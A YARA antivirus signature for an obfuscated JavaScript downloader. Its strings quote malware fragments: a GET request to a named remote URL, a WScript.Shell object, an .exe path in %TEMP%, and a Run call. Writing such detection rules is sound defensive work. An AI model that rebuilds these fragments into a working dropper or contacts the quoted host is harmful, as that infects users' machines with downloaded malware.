rule sig_20160401_aa6abe7e94e75a2bac90b0912a9b232b {
  meta:
    description = "datamaliciousorder - file 20160401_aa6abe7e94e75a2bac90b0912a9b232b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b8f3581adce56312bffbd438c8556b1bef00292aed2aeb41ffc634505e49766"

  strings:
    $s1  = "RjCy[UnoUcl](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "var BmtQp = function VlQjm() {return WScript[CbiVga](\"WScript\"+\".Shell\");}(), DteZm = 11;" fullword ascii
    $s3  = "function HxVh(JgvFso, XilJi){GayIqk = GayIqk * 1; return JgvFso - XilJi;};" fullword ascii
    $s4  = "if (RjCy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IzNit() {return BmtQp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FHpJuZ6qW1N.ex\" + \"e\";};" fullword ascii
    $s6  = "function HnDy(){return VmOg + \"\";};" fullword ascii
    $s7  = "function SquQa() {return ((GhFt == true) && (GhFt == WaMu)) ? 1 : GayIqk;};" fullword ascii
    $s8  = "function IskHe()" fullword ascii
    $s9  = "function BfvUhh(VwLw){BmtQp[\"R\"+\"un\"](VwLw, GayIqk, GayIqk);};" fullword ascii
    $s10 = "var GhFt = false;" fullword ascii
    $s11 = "var WaMu = false;" fullword ascii
    $s12 = "return HxVh(SidXll, WgiLei);" fullword ascii
    $s13 = "function IeClo(){return 23;};" fullword ascii
    $s14 = "GhFt = true; " fullword ascii
    $s15 = "function NvgGls(){return CbiVga;};" fullword ascii
    $s16 = "var TjYa = false;" fullword ascii
    $s17 = "var LsyOb = new this[\"Date\"]();" fullword ascii
    $s18 = "WaMu = true; " fullword ascii
    $s19 = "}while (CjQwu);" fullword ascii
    $s20 = "function HnjDf(FwFg) {var HzAcp = (1, 2, 3, 4, 5, FwFg); return HzAcp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}